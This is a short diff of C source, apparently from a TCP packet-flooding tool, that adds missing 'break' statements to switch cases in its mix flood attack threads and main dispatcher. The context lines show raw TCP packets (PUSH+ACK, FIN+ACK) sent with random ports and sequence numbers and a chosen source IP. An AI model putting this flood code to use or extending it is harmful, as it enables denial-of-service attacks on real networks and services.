@@ -766,6 +766,7 @@ void *mix_flood_attack_thread(void *param)
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_PUSH | TCP_ACK,
                                 send_data_size, get_send_data());
+                break;
             case 3: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
@@ -809,6 +810,7 @@ void *mix2_flood_attack_thread(void *param)
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_PUSH | TCP_ACK,
                                 send_data_size, get_send_data());
+                break;
             case 2: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
@@ -1640,6 +1642,7 @@ int main(int argc, char **argv)
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, mix2_flood_attack_thread, NULL);
             interface_tx_thread();
+            break;
         case PA_FLOOD:
             if(!quiet) printf("PA FLOOD\n");
             for(i=0; i < num_threads; ++i)
